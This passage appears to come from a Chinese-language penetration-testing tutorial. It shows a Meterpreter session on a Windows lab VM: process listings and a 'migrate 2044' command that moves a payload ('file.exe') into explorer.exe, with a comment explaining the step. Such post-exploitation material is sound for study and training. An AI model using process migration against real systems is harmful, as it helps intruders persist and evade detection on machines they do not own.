<p>432&nbsp;&nbsp;&nbsp;<span lang="EN-US">380</span>&nbsp;&nbsp;&nbsp;winlogon.exe&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;x86_<span lang="EN-US">64</span>&nbsp;&nbsp;<span lang="EN-US">1</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;NT&nbsp;<span lang="EN-US">AUTHORITYSYSTEM</span><span lang="EN-US">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;C:WindowsSystem32winlogon.</span><span lang="EN-US">exe</span></p>
<p>492&nbsp;&nbsp;&nbsp;<span lang="EN-US">396</span>&nbsp;&nbsp;&nbsp;services.exe&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;x86_<span lang="EN-US">64</span>&nbsp;&nbsp;<span lang="EN-US">0</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;NT&nbsp;<span lang="EN-US">AUTHORITYSYSTEM</span><span lang="EN-US">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;C:WindowsSystem32services.</span><span lang="EN-US">exe</span></p>
<p>500&nbsp;&nbsp;&nbsp;<span lang="EN-US">396</span>&nbsp;&nbsp;&nbsp;lsass.exe&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;x86_<span lang="EN-US">64</span>&nbsp;&nbsp;<span lang="EN-US">0</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;NT&nbsp;<span lang="EN-US">AUTHORITYSYSTEM</span><span lang="EN-US">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;C:WindowsSystem32lsass.</span><span lang="EN-US">exe</span></p>
<p>512&nbsp;&nbsp;&nbsp;<span lang="EN-US">396</span>&nbsp;&nbsp;&nbsp;lsm.exe&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;x86_<span lang="EN-US">64</span>&nbsp;&nbsp;<span lang="EN-US">0</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;NT&nbsp;<span lang="EN-US">AUTHORITYSYSTEM</span><span lang="EN-US">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;C:WindowsSystem32lsm.</span><span lang="EN-US">exe</span></p>
<p>596&nbsp;&nbsp;&nbsp;<span lang="EN-US">492</span>&nbsp;&nbsp;&nbsp;svchost.exe&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;x86_<span lang="EN-US">64</span>&nbsp;&nbsp;<span lang="EN-US">0</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;NT&nbsp;<span lang="EN-US">AUTHORITYSYSTEM</span><span lang="EN-US">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;C:WindowsSystem32svchost.</span><span lang="EN-US">exe</span></p>
<p>656&nbsp;&nbsp;&nbsp;<span lang="EN-US">492</span>&nbsp;&nbsp;&nbsp;svchost.exe&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;x86_<span lang="EN-US">64</span>&nbsp;&nbsp;<span lang="EN-US">0</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;NT&nbsp;AUTHORITYNETWORK&nbsp;<span lang="EN-US">SERVICE</span>&nbsp;&nbsp;&nbsp;C:WindowsSystem32svchost.<span lang="EN-US">exe</span></p>
<p>748&nbsp;&nbsp;&nbsp;<span lang="EN-US">492</span>&nbsp;&nbsp;&nbsp;svchost.exe&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;x86_<span lang="EN-US">64</span>&nbsp;&nbsp;<span lang="EN-US">0</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;NT&nbsp;AUTHORITYLOCAL&nbsp;<span lang="EN-US">SERVICE</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;C:WindowsSystem32svchost.<span lang="EN-US">exe</span></p>
<p>796&nbsp;&nbsp;&nbsp;<span lang="EN-US">492</span>&nbsp;&nbsp;&nbsp;svchost.exe&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;x86_<span lang="EN-US">64</span>&nbsp;&nbsp;<span lang="EN-US">0</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;NT&nbsp;<span lang="EN-US">AUTHORITYSYSTEM</span><span lang="EN-US">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;C:WindowsSystem32svchost.</span><span lang="EN-US">exe</span></p>
<p>840&nbsp;&nbsp;&nbsp;<span lang="EN-US">492</span>&nbsp;&nbsp;&nbsp;svchost.exe&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;x86_<span lang="EN-US">64</span>&nbsp;&nbsp;<span lang="EN-US">0</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;NT&nbsp;AUTHORITYLOCAL&nbsp;<span lang="EN-US">SERVICE</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;C:WindowsSystem32svchost.<span lang="EN-US">exe</span></p>
<p>856&nbsp;&nbsp;&nbsp;<span lang="EN-US">388</span>&nbsp;&nbsp;&nbsp;conhost.exe&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;x86_<span lang="EN-US">64</span>&nbsp;&nbsp;<span lang="EN-US">1</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;WIN-<span lang="EN-US">K30V5SI0PCEAdministrator</span><span lang="EN-US">&nbsp;&nbsp;C:WindowsSystem32conhost.</span><span lang="EN-US">exe</span></p>
<p>860&nbsp;&nbsp;&nbsp;<span lang="EN-US">2044</span>&nbsp;&nbsp;cmd.exe&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;x86_<span lang="EN-US">64</span>&nbsp;&nbsp;<span lang="EN-US">1</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;WIN-<span lang="EN-US">K30V5SI0PCEAdministrator</span><span lang="EN-US">&nbsp;&nbsp;C:WindowsSystem32cmd.</span><span lang="EN-US">exe</span></p>
<p>884&nbsp;&nbsp;&nbsp;<span lang="EN-US">492</span>&nbsp;&nbsp;&nbsp;svchost.exe&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;x86_<span lang="EN-US">64</span>&nbsp;&nbsp;<span lang="EN-US">0</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;NT&nbsp;<span lang="EN-US">AUTHORITYSYSTEM</span><span lang="EN-US">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;C:WindowsSystem32svchost.</span><span lang="EN-US">exe</span></p>
<p>924&nbsp;&nbsp;&nbsp;<span lang="EN-US">492</span>&nbsp;&nbsp;&nbsp;svchost.exe&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;x86_<span lang="EN-US">64</span>&nbsp;&nbsp;<span lang="EN-US">0</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;NT&nbsp;AUTHORITYNETWORK&nbsp;<span lang="EN-US">SERVICE</span>&nbsp;&nbsp;&nbsp;C:WindowsSystem32svchost.<span lang="EN-US">exe</span></p>
<p>972&nbsp;&nbsp;&nbsp;<span lang="EN-US">492</span>&nbsp;&nbsp;&nbsp;sppsvc.exe&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;x86_<span lang="EN-US">64</span>&nbsp;&nbsp;<span lang="EN-US">0</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;NT&nbsp;AUTHORITYNETWORK&nbsp;<span lang="EN-US">SERVICE</span>&nbsp;&nbsp;&nbsp;C:WindowsSystem32sppsvc.<span lang="EN-US">exe</span></p>
<p>976&nbsp;&nbsp;&nbsp;<span lang="EN-US">492</span>&nbsp;&nbsp;&nbsp;spoolsv.exe&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;x86_<span lang="EN-US">64</span>&nbsp;&nbsp;<span lang="EN-US">0</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;NT&nbsp;<span lang="EN-US">AUTHORITYSYSTEM</span><span lang="EN-US">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;C:WindowsSystem32spoolsv.</span><span lang="EN-US">exe</span></p>
<p>1056&nbsp;&nbsp;<span lang="EN-US">492</span>&nbsp;&nbsp;&nbsp;svchost.exe&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;x86_<span lang="EN-US">64</span>&nbsp;&nbsp;<span lang="EN-US">0</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;NT&nbsp;AUTHORITYLOCAL&nbsp;<span lang="EN-US">SERVICE</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;C:WindowsSystem32svchost.<span lang="EN-US">exe</span></p>
<p>1092&nbsp;&nbsp;<span lang="EN-US">492</span>&nbsp;&nbsp;&nbsp;vmtoolsd.exe&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;x86_<span lang="EN-US">64</span>&nbsp;&nbsp;<span lang="EN-US">0</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;NT&nbsp;<span lang="EN-US">AUTHORITYSYSTEM</span><span lang="EN-US">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;C:Program&nbsp;FilesVMwareVMware&nbsp;Toolsvmtoolsd.</span><span lang="EN-US">exe</span></p>
<p>1332&nbsp;&nbsp;<span lang="EN-US">492</span>&nbsp;&nbsp;&nbsp;svchost.exe&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;x86_<span lang="EN-US">64</span>&nbsp;&nbsp;<span lang="EN-US">0</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;NT&nbsp;AUTHORITYNETWORK&nbsp;<span lang="EN-US">SERVICE</span>&nbsp;&nbsp;&nbsp;C:WindowsSystem32svchost.<span lang="EN-US">exe</span></p>
<p>1492&nbsp;&nbsp;<span lang="EN-US">2044</span>&nbsp;&nbsp;vmtoolsd.exe&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;x86_<span lang="EN-US">64</span>&nbsp;&nbsp;<span lang="EN-US">1</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;WIN-<span lang="EN-US">K30V5SI0PCEAdministrator</span><span lang="EN-US">&nbsp;&nbsp;C:Program&nbsp;FilesVMwareVMware&nbsp;Toolsvmtoolsd.</span><span lang="EN-US">exe</span></p>
<p>1560&nbsp;&nbsp;<span lang="EN-US">492</span>&nbsp;&nbsp;&nbsp;dllhost.exe&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;x86_<span lang="EN-US">64</span>&nbsp;&nbsp;<span lang="EN-US">0</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;NT&nbsp;<span lang="EN-US">AUTHORITYSYSTEM</span><span lang="EN-US">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;C:WindowsSystem32dllhost.</span><span lang="EN-US">exe</span></p>
<p>1640&nbsp;&nbsp;<span lang="EN-US">492</span>&nbsp;&nbsp;&nbsp;msdtc.exe&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;x86_<span lang="EN-US">64</span>&nbsp;&nbsp;<span lang="EN-US">0</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;NT&nbsp;AUTHORITYNETWORK&nbsp;<span lang="EN-US">SERVICE</span>&nbsp;&nbsp;&nbsp;C:WindowsSystem32msdtc.<span lang="EN-US">exe</span></p>
<p>1968&nbsp;&nbsp;<span lang="EN-US">492</span>&nbsp;&nbsp;&nbsp;taskhost.exe&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;x86_<span lang="EN-US">64</span>&nbsp;&nbsp;<span lang="EN-US">1</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;WIN-<span lang="EN-US">K30V5SI0PCEAdministrator</span><span lang="EN-US">&nbsp;&nbsp;C:WindowsSystem32taskhost.</span><span lang="EN-US">exe</span></p>
<p>2024&nbsp;&nbsp;<span lang="EN-US">884</span>&nbsp;&nbsp;&nbsp;dwm.exe&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;x86_<span lang="EN-US">64</span>&nbsp;&nbsp;<span lang="EN-US">1</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;WIN-<span lang="EN-US">K30V5SI0PCEAdministrator</span><span lang="EN-US">&nbsp;&nbsp;C:WindowsSystem32dwm.</span><span lang="EN-US">exe</span></p>
<p>2044&nbsp;&nbsp;<span lang="EN-US">2016</span>&nbsp;&nbsp;explorer.exe&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;x86_<span lang="EN-US">64</span>&nbsp;&nbsp;<span lang="EN-US">1</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;WIN-<span lang="EN-US">K30V5SI0PCEAdministrator</span><span lang="EN-US">&nbsp;&nbsp;C:Windowsexplorer.</span><span lang="EN-US">exe</span></p>
<p>2204&nbsp;&nbsp;<span lang="EN-US">2428</span>&nbsp;&nbsp;mscorsvw.exe&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;x86_<span lang="EN-US">64</span>&nbsp;&nbsp;<span lang="EN-US">0</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;NT&nbsp;<span lang="EN-US">AUTHORITYSYSTEM</span><span lang="EN-US">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;C:WindowsMicrosoft.NETFramework64v2.</span><span lang="EN-US">0.50727mscorsvw.exe</span></p>
<p>2312&nbsp;&nbsp;<span lang="EN-US">492</span>&nbsp;&nbsp;&nbsp;svchost.exe&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;x86_<span lang="EN-US">64</span>&nbsp;&nbsp;<span lang="EN-US">0</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;NT&nbsp;<span lang="EN-US">AUTHORITYSYSTEM</span><span lang="EN-US">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;C:WindowsSystem32svchost.</span><span lang="EN-US">exe</span></p>
<p>2332&nbsp;&nbsp;<span lang="EN-US">2044</span>&nbsp;&nbsp;file.exe&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span lang="EN-US">x86</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span lang="EN-US">1</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;WIN-<span lang="EN-US">K30V5SI0PCEAdministrator</span><span lang="EN-US">&nbsp;&nbsp;C:UsersAdministratorDesktopfile.</span><span lang="EN-US">exe</span></p>
<p>2428&nbsp;&nbsp;<span lang="EN-US">492</span>&nbsp;&nbsp;&nbsp;mscorsvw.exe&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;x86_<span lang="EN-US">64</span>&nbsp;&nbsp;<span lang="EN-US">0</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;NT&nbsp;<span lang="EN-US">AUTHORITYSYSTEM</span><span lang="EN-US">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;C:WindowsMicrosoft.NETFramework64v2.</span><span lang="EN-US">0.50727mscorsvw.exe</span></p>
<p>2588&nbsp;&nbsp;<span lang="EN-US">492</span>&nbsp;&nbsp;&nbsp;mscorsvw.exe&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span lang="EN-US">x86</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span lang="EN-US">0</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;NT&nbsp;<span lang="EN-US">AUTHORITYSYSTEM</span><span lang="EN-US">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;C:WindowsMicrosoft.NETFrameworkv2.</span><span lang="EN-US">0.50727mscorsvw.exe</span></p>
<p>2972&nbsp;&nbsp;<span lang="EN-US">492</span>&nbsp;&nbsp;&nbsp;svchost.exe&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;x86_<span lang="EN-US">64</span>&nbsp;&nbsp;<span lang="EN-US">0</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;NT&nbsp;<span lang="EN-US">AUTHORITYSYSTEM</span><span lang="EN-US">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;C:WindowsSystem32svchost.exe</span></p>
<p>&nbsp;</p>
<p>meterpreter&nbsp;&gt;&nbsp;migrate&nbsp;2044&nbsp;//迁移到PID为<span lang="EN-US&gt;">2044</span>的explorer进程</p>
<p>[*]&nbsp;Migrating&nbsp;from&nbsp;2332&nbsp;to&nbsp;2044...</p>
<p>[*]&nbsp;Migration&nbsp;completed&nbsp;successfully.</p>
<p>meterpreter&nbsp;&gt;</p>
<p>meterpreter&nbsp;&gt;&nbsp;ps</p>
<p>&nbsp;</p>
<p>Process&nbsp;List</p>
<p>============</p>
<p>&nbsp;</p>
<p>PID&nbsp;&nbsp;&nbsp;PPID&nbsp;&nbsp;Name&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Arch&nbsp;&nbsp;&nbsp;&nbsp;Session&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;User&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Path</p>
<p>---&nbsp;&nbsp;&nbsp;----&nbsp;&nbsp;----&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;----&nbsp;&nbsp;&nbsp;&nbsp;-------&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;----&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;----</p>
<p>0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[System&nbsp;Process]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;4294967295&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</p>
<p>4&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;System&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;x86_64&nbsp;&nbsp;0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</p>
<p>244&nbsp;&nbsp;&nbsp;4&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;smss.exe&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;x86_64&nbsp;&nbsp;0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;NT&nbsp;AUTHORITYSYSTEM&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;SystemRootSystem32smss.exe</p>
<p>264&nbsp;&nbsp;&nbsp;492&nbsp;&nbsp;&nbsp;svchost.exe&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;x86_64&nbsp;&nbsp;0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;NT&nbsp;AUTHORITYLOCAL&nbsp;SERVICE&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;C:\Windows\system32\svchost.exe</p>
<p>336&nbsp;&nbsp;&nbsp;328&nbsp;&nbsp;&nbsp;csrss.exe&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;x86_64&nbsp;&nbsp;0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;NT&nbsp;AUTHORITYSYSTEM&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;C:\Windows\system32\csrss.exe</p>
<p>388&nbsp;&nbsp;&nbsp;380&nbsp;&nbsp;&nbsp;csrss.exe&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;x86_64&nbsp;&nbsp;1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;NT&nbsp;AUTHORITYSYSTEM&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;C:\Windows\system32\csrss.exe</p>
<p>396&nbsp;&nbsp;&nbsp;328&nbsp;&nbsp;&nbsp;wininit.exe&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;x86_64&nbsp;&nbsp;0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;NT&nbsp;AUTHORITYSYSTEM&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;C:\Windows\system32\wininit.exe</p>
<p>432&nbsp;&nbsp;&nbsp;380&nbsp;&nbsp;&nbsp;winlogon.exe&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;x86_64&nbsp;&nbsp;1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;NT&nbsp;AUTHORITYSYSTEM&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;C:\Windows\system32\winlogon.exe</p>
<p>492&nbsp;&nbsp;&nbsp;396&nbsp;&nbsp;&nbsp;services.exe&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;x86_64&nbsp;&nbsp;0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;NT&nbsp;AUTHORITYSYSTEM&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;C:\Windows\system32\services.exe</p>
<p>500&nbsp;&nbsp;&nbsp;396&nbsp;&nbsp;&nbsp;lsass.exe&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;x86_64&nbsp;&nbsp;0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;NT&nbsp;AUTHORITYSYSTEM&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;C:\Windows\system32\lsass.exe</p>
<p>512&nbsp;&nbsp;&nbsp;396&nbsp;&nbsp;&nbsp;lsm.exe&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;x86_64&nbsp;&nbsp;0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;NT&nbsp;AUTHORITYSYSTEM&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;C:\Windows\system32\lsm.exe</p>
<p>596&nbsp;&nbsp;&nbsp;492&nbsp;&nbsp;&nbsp;svchost.exe&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;x86_64&nbsp;&nbsp;0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;NT&nbsp;AUTHORITYSYSTEM&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;C:\Windows\system32\svchost.exe</p>
<p>656&nbsp;&nbsp;&nbsp;492&nbsp;&nbsp;&nbsp;svchost.exe&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;x86_64&nbsp;&nbsp;0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;NT&nbsp;AUTHORITYNETWORK&nbsp;SERVICE&nbsp;&nbsp;&nbsp;C:\Windows\system32\svchost.exe</p>
